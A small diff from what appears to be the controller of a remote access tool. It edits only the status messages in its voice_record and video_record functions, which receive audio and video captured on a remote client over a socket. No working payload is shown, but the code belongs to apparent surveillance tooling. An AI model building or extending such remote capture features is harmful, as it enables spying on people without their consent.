@@ -324,7 +324,7 @@ def voice_record(cmd,conn):
 
 		print()
 		print('  [!] VOICE RECORD')
-		print('  [!] Recording, Please wait for: ' + duration + 'sec')
+		print('  [!] Recording, Please wait for: ' + duration + ' sec')
 		f = open(file_Name, 'wb')
 		file_Size = str(conn.recv(1024), 'utf-8')
 
@@ -362,8 +362,8 @@ def video_record(cmd,conn):
 	if client_response == 'VIDEO_RECORDING':
 
 		print()
-		print('  [!] VIDEO RECORD!!!')
-		print('  [!] Recording, Please wait for: ' + duration + 'sec')
+		print('  [!] VIDEO RECORD')
+		print('  [!] Recording, Please wait for: ' + duration + ' sec')
 		f = open(file_Name, 'wb')
 		file_Size = str(conn.recv(1024), 'utf-8')
 
